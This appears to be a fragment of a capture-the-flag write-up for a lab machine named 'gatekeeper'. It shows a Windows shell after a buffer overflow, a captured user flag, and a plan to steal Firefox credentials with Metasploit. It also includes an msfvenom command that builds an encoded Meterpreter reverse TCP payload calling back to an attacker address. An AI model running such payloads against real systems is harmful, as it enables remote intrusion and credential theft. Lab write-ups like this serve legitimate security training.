Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>whoami
whoami
gatekeeper\natbat

C:\Users\natbat\Desktop>more user.txt.txt
more user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!

now using metasploit so generate a meterpreter with msfconsole and replace or create a new one exploit.py

Privilege Escalation

While performing enumeration of common files and folders, found out that Mozilla Firefox is installed on the box, so decided to use Metasploit to exctract browser credentials.

Generating Meterpreter shellcode using the following flags:

    -p to specify the payload type, in this case, the Windows Meterpreter Reverse TCP Shell
    LHOST to specify the localhost IP address to connect to
    LPORT to specify the local port to connect to
    -f to specify the format
    -b to specify the bad characters
    -e to specify the encoder
    -v to specify the name of the variable used for the shellcode
```
```text
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.81.220 LPORT=1337 -e x86/shikata_ga_nai -f exe -b "\x00\xa" -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
